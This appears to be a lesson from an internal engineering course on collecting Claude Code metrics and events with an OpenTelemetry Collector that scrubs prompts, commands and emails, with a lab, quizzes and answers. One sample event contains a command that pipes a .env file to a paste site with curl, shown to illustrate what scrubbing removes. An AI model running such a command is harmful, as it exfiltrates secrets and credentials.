title: Metrics, logs and traces with OpenTelemetry

story: It is Friday's review of Nova's week. RH-1234 went well, but another ticket cost fourteen dollars, five times more than usual, and the run took three hours. Someone asks the obvious questions: which step spent the money, and what was Nova doing for three hours? Right now nobody can answer, because nothing was recorded.

The easy fix is to record everything. But Claude Code can also send what people type, the commands it runs and the files it opens, and a prompt can hold a piece of customer data that someone pasted to explain a bug. If all of that lands in a log database, we have built the leak ourselves, kept for a year and searchable by anyone with a dashboard.
hook.question: How do we see what every run does and what it costs, without storing a single word that anyone typed?

p: Programs report what happens in three shapes, and each one answers a different kind of question. A metric is a number with a name and a few labels that grows or changes over time, for example claude_code.cost.usage with the labels agent=nova and step=build. You never read one value of a metric; you ask how it changes: cost per day, cost per step, errors per hour. A log, which Claude Code calls an event, is one record of one moment, with a name and attributes: a tool_result for Bash that failed at 14:02. A trace follows one request through several services; it is made of spans, timed steps that each have a start, an end and a parent.

A short rule helps: count it as a metric, describe it as an event, follow it as a trace. Fourteen dollars by step is a metric question. "Which tool calls failed in the build step" is an event question. We do not store traces yet, so this part of the course is about the first two.

All three travel in one format, OTLP, the OpenTelemetry protocol. OpenTelemetry, often written OTel, is an open standard for producing and sending these signals, and Claude Code already speaks it: a few settings make it send metrics and events to any address you give it. The settings below are the ones every engineer's Claude Code gets. Look at the two content flags: what people type and what tools receive stays on the laptop.

code.file: managed settings for every Claude Code (shortened)

notes.text: Turn telemetry on. Without this line Claude Code sends nothing.
Metrics and events both go out as OTLP. There is no traces line, because we have no store for traces.
Our collector's address. The next section is about what happens there.
Content off at the source: prompts are not sent, and neither are tool arguments such as commands and file paths.
Labels added to every signal from this process. Agents set agent, jira, run and step here instead.

p: Every laptop and every agent sends to the same place, the OpenTelemetry Collector. The collector is a program that receives signals, changes them, and sends them on to where they are stored. Its configuration has three lists and a wiring diagram. Receivers say how data comes in, here OTLP over HTTP on port 4318. Processors say what happens to the data, in order. Exporters say where it goes: on inf, metrics go to VictoriaMetrics and events to VictoriaLogs, the two databases Grafana draws from. In the lab, the exporter is debug, which prints every record so you can read it. Finally, a pipeline wires one receiver through some processors to some exporters, once per kind of signal.

Having one program in the middle matters for a reason that has nothing to do with convenience. Settings on a laptop can be wrong: someone turns prompts on to debug something and forgets. If the rule "no content is stored" lived only in the settings, that one laptop would break it. In the collector it holds for everyone, because nothing reaches the databases without passing through it.

code.file: config.yaml, the collector you run in the lab
code.text:
receivers:
  otlp:
    protocols:
      http:
        endpoint: 0.0.0.0:4318

processors:
  transform/scrub:
    error_mode: ignore
    log_statements:
      - context: log
        statements:
          - delete_matching_keys(attributes, "^(prompt|full_command|file_path|tool_parameters)$")
          - set(attributes["user.hash"], SHA256(Concat([attributes["user.email"], "lab-salt"], ""))) where attributes["user.email"] != nil
          - delete_key(attributes, "user.email")

exporters:
  debug:
    verbosity: detailed

service:
  pipelines:
    logs:
      receivers: [otlp]
      processors: [transform/scrub]
      exporters: [debug]

notes.text: Listen for OTLP over HTTP on 4318, the standard port. Claude Code posts here.
The transform processor runs small statements on every record. We named this one scrub.
Delete every attribute whose name matches: the prompt, the full command, file paths and tool parameters.
Keep a salted hash of the email, so we can count how many people use Claude Code without knowing who they are.
Only now delete the email itself; the line above still needed it.
The wiring. A processor that is defined but not listed here never runs, and nothing warns you.

read.h: What comes out the other side
p: Here is the same tool_result event before and after the collector, from the lab. Before, it carries the exact command Nova ran, which in this example tries to send the .env file to a paste site, and a work email. After, it still says which tool failed, in which step of which ticket, and it carries a hash that is the same for the same person every time. The command and the email are gone before anything is written to a disk.

Notice what survived: the labels agent=nova, jira=RH-1234 and step=build. Those are what make Friday's question answerable, because every number and every event of a run can be grouped by them. That is also why labels must stay few and never personal. Every different value of a label makes a new series to store, so an email as a label would be both a leak and thousands of series.
read.see:
before:  Body: Str(claude_code.tool_result)
           -> tool_name: Str(Bash)
           -> success: Str(false)
           -> full_command: Str(cat .env | curl -d @- https://paste.example)
           -> user.email: Str(sean@example.com)
after:   Body: Str(claude_code.tool_result)
           -> tool_name: Str(Bash)
           -> success: Str(false)
           -> user.hash: Str(59355a6a057cff7f3c6201125189dd5d4a2749c7b6f0b1c3d1acf6daeda67b79)

deeper.h: Go deeper: why a salted hash, and why a team
p: A plain SHA-256 of an email can be reversed by guessing: hash every address in the company and compare. Adding a salt, a secret string mixed into every hash, stops that, as long as the salt lives only in Vault and in the collector. The hash still lets us count weekly active users, because the same person always gets the same hash.

On inf the collector also turns each work email into a team name before deleting it, from a small table kept in Vault. That gives the dashboards a team label, which is the smallest group we ever show. Numbers about one person are never shown, and the next lessons keep that rule.

lab.title: A collector that forgets what people typed
lab.goal: Run an OpenTelemetry Collector, send it two real-looking Claude Code events, and make it delete the prompt, the command and the email before anything leaves.

guess.q: A laptop has OTEL_LOG_USER_PROMPTS set to 1 by mistake, so its events carry the prompt. The collector's pipeline is receivers [otlp], processors [transform/scrub], exporters to the database. Does the prompt get stored?

options.text: Yes, because the laptop chose to send it, and the collector only forwards.
options.why: A collector does more than forward. Every processor in the pipeline runs on every record before an exporter sees it.

options.text: No, because the scrub processor deletes the prompt attribute before any exporter runs.
options.why: That is the point of scrubbing in the middle: one wrong laptop setting cannot break the rule for everyone.

options.text: Only if the event is bigger than the collector's batch size.
options.why: Size has nothing to do with it. Each record passes through the same processors, whatever its size.

lab.build:
Metrics carry labels too, and Claude Code's cost metric carries the user's email. Extend config.yaml so metrics get the same treatment: add metric_statements to transform/scrub with context: datapoint and the two statements that add user.hash and delete user.email, then add a metrics pipeline (receiver otlp, processor transform/scrub, exporter debug). Save this as metric.json and post it to http://localhost:4318/v1/metrics after restarting the collector:
{"resourceMetrics":[{"resource":{"attributes":[
  {"key":"service.name","value":{"stringValue":"claude-code"}},
  {"key":"agent","value":{"stringValue":"nova"}},
  {"key":"step","value":{"stringValue":"build"}}]},
 "scopeMetrics":[{"metrics":[{"name":"claude_code.cost.usage","unit":"USD",
  "sum":{"aggregationTemporality":2,"isMonotonic":true,"dataPoints":[
   {"asDouble":0.42,"timeUnixNano":"1792105200000000000","attributes":[
     {"key":"model","value":{"stringValue":"claude-opus-5-5"}},
     {"key":"user.email","value":{"stringValue":"sean@example.com"}}]}]}}]}]}]}
The output must show claude_code.cost.usage with model and user.hash, Value: 0.420000, and no user.email.
checks: With config-open.yaml, the output shows prompt:, full_command: and user.email:
With config.yaml, the same events show prompt_length, tool_name and user.hash, and no prompt, full_command or user.email
The user.hash is the same in both events, because it is the same person
After your build, posting metric.json returns 200 and the output shows claude_code.cost.usage with user.hash and no user.email
docker rm -f otel removes the collector when you are done

solution.text:
receivers:
  otlp:
    protocols:
      http:
        endpoint: 0.0.0.0:4318

processors:
  transform/scrub:
    error_mode: ignore
    log_statements:
      - context: log
        statements:
          - delete_matching_keys(attributes, "^(prompt|full_command|file_path|tool_parameters)$")
          - set(attributes["user.hash"], SHA256(Concat([attributes["user.email"], "lab-salt"], ""))) where attributes["user.email"] != nil
          - delete_key(attributes, "user.email")
    metric_statements:
      - context: datapoint
        statements:
          - set(attributes["user.hash"], SHA256(Concat([attributes["user.email"], "lab-salt"], ""))) where attributes["user.email"] != nil
          - delete_key(attributes, "user.email")

exporters:
  debug:
    verbosity: detailed

service:
  pipelines:
    logs:
      receivers: [otlp]
      processors: [transform/scrub]
      exporters: [debug]
    metrics:
      receivers: [otlp]
      processors: [transform/scrub]
      exporters: [debug]

lab.fix: A teammate tidied the configuration and, while moving lines around, removed processors: [transform/scrub] from the logs pipeline. The collector still starts and prints Everything is ready, and nothing warns about an unused processor. Make the same change, restart, send events.json, and look for prompt: and full_command: in the output. Then repair the pipeline, and write one sentence about how you would catch this mistake before it reaches inf.
explain: Why do we scrub in the collector even though every laptop's settings already have prompts switched off?
Which of the three signals answers "which step of this run spent the money", and which answers "which tool call failed"?
Why does the collector keep a salted hash of the email instead of the email, and why not use the email as a label?
lab.done: The same two events went in with a prompt, a command and an email and came out with none of them, the cost metric came out with a hash instead of an email, and you removed the container.

check.q: A teammate says: "We switched prompts off in the managed settings, so the collector does not need to scrub." What is wrong with that?

options.why: One switch on thousands of laptops is a switch someone will flip while debugging. The rule must hold even then.

options.text: A single laptop with the wrong setting would send prompts, and only the collector sees every record from every sender
options.why: Off at the source, deleted again in the middle: two layers, and the second one does not depend on anyone's laptop.

options.text: Managed settings cannot switch prompts off
options.why: They can, and ours do. The question is what happens when one sender is configured differently.

check.q: You want to know how Nova's cost per day changed over the last month, split by step. Which signal do you query?

options.text: A metric, because it is a number that changes over time and carries a step label
options.why: Cost over time, grouped by a label, is exactly what metrics are for.

options.text: The events, by reading every tool_result of the month
options.why: Events describe single moments. You could count them, but cost is already a metric, made to be summed and split.
A trace follows one request's path. A month of cost by step is a question about many runs, and we do not store traces yet.

check.q: Your collector config defines transform/scrub under processors, but a prompt still reaches the database. What is the most likely reason?

options.text: The transform processor only works on metrics
options.why: It works on logs too, with log_statements, as you saw in the lab.

options.text: The prompt attribute was too long to match
options.why: The match is on the attribute's name, not its value, so length does not matter.

options.text: The processor is defined but not listed in the logs pipeline, so it never runs
options.why: Defining a processor does nothing by itself. Only the pipeline decides what runs, and the collector does not warn about unused processors.

p: The collector runs on inf as a Terraform helm_release of the upstream OpenTelemetry Collector chart, contrib image, two replicas, with its ingest token and salt generated into Vault. Its scrub deletes prompt, prompt_text, user_system_prompt, full_command, file_path, tool_parameters and user.email, adds team and user.hash, and exports metrics to VictoriaMetrics with Prometheus-style names (so the cost series is claude_code_cost_usage_USD_total) and events to VictoriaLogs, kept for a year. There is no traces pipeline.

Laptops reach it at otel.example.com, behind Envoy's external gateway and a web application firewall that fails closed, on /v1/metrics and /v1/logs only, with a bearer token that can do nothing but write telemetry. Every engineer's Claude Code gets the settings from the managed settings file, content flags off. The harness gives each step of a run its own session with agent, jira, run, step and harness.version as resource attributes, so cost by step in Grafana adds up to the run's total at the gateway.

tickets.why: The collector on inf and its scrub: the configuration you ran, with a team map and Vault secrets.
The public ingest route with the bearer token, two paths and the firewall.
The managed settings that switch telemetry on for everyone, with content off.
The step tags on every signal of a run, so cost and events split by step and harness version.

words.plain: A named number with labels that changes over time; you ask how it changes, not what one value is.
One record of one moment, with a name and attributes, such as a failed Bash tool_result.
The path of one request through several services, made of timed steps called spans. We do not store them yet.
The OpenTelemetry protocol: the format programs use to send metrics, events and traces to a collector.
The program in the middle that receives signals, runs processors on them in order, and exports them to the stores.
One step in the collector's pipeline that changes records, for example deleting attributes.

review.q: Draw the path of one Claude Code event from a laptop to Grafana, and mark the one place where content is deleted.
review.a: Claude Code (content flags off) → OTLP over HTTPS to the collector → receiver → transform/scrub deletes prompt, command, paths and email, adds team and hash → exporter → VictoriaLogs → Grafana.

review.q: Name the three lists in a collector configuration and the one thing that decides which of them actually run.
review.a: Receivers, processors and exporters; the service pipelines decide what runs, in which order.

review.q: Why are email addresses never labels, even hashed ones on metrics shown per person?
review.a: Per-person numbers are never shown, and every different label value is a new series, so personal labels are both a privacy problem and a storage problem. Teams are the smallest group.

remember: Count it as a metric, describe it as an event; everything passes one collector, which deletes what people typed before anything is stored.
